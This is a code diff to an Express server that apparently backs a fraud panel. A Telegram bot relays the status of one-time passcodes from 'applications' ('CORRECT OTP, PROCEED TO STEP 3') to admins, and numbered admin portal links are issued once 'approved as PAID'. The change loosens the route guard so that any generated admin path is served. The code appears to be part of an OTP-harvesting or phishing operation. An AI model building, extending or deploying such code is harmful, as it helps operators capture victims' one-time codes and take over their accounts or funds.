@@ -369,10 +369,8 @@ app.post('/api/telegram-webhook', async (req, res) => {
         const paddedId = String(adminCounter).padStart(4, '0');  
         assignedPath = `/Admin-${paddedId}`;  
         secondaryAdmins.set(targetUserId, assignedPath);  
-        pathToAdminChat.set(assignedPath, targetUserId.toString());  
       } else {  
         assignedPath = secondaryAdmins.get(targetUserId);  
-        pathToAdminChat.set(assignedPath, targetUserId.toString());  
       }  
     }  
     savePersistentData();  
@@ -429,7 +427,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
       appData.status = 'OTP_APPROVED';
       activeApplications.set(appReference, appData);
     }
-    const updatedText = `${callback_query.message.text}\n\n🟢 <b>STATUS: CORRECT OTP ✅</b>`;
+    const updatedText = `${callback_query.message.text}\n\n🟢 <b>STATUS: CORRECT OTP ✅ (PROCEED TO STEP 3)</b>`;
     await editTelegramMessage(botToken, chatId, messageId, updatedText);
   }
 
@@ -457,18 +455,21 @@ async function editTelegramMessage(botToken, chatId, messageId, text) {
   }
 }
 
-// PERMANENT ROUTE GUARD: Once mapped by Main Admin, this link serves index.html freely forever without re-blocking
+// PERMANENT ROUTE GUARD: Once generated and approved as PAID, any secondary admin link opens freely without needing an active chat mapping lock
 app.get('/Admin-*', (req, res) => {
   const requestedPath = req.path;
 
-  if (pathToAdminChat.has(requestedPath)) {
+  // Check if the path exists in secondaryAdmins values or matches Admin-0001
+  const isAllowedPath = requestedPath === '/Admin-0001' || Array.from(secondaryAdmins.values()).includes(requestedPath);
+
+  if (isAllowedPath) {
     return res.sendFile(path.join(publicPath, 'index.html'));
   } else {
-    return res.status(403).send("<h1>403 Forbidden - Unauthorized Portal Link</h1><p>This portal link is not active or has not been approved by the main administrator.</p>");
+    return res.status(403).send("<h1>403 Forbidden - Unauthorized Portal Link</h1><p>This portal link is not recognized or has not been approved.</p>");
   }
 });
 
 app.listen(PORT, () => {
   console.log(`Server is running on port ${PORT}`);
 });
-        
+  
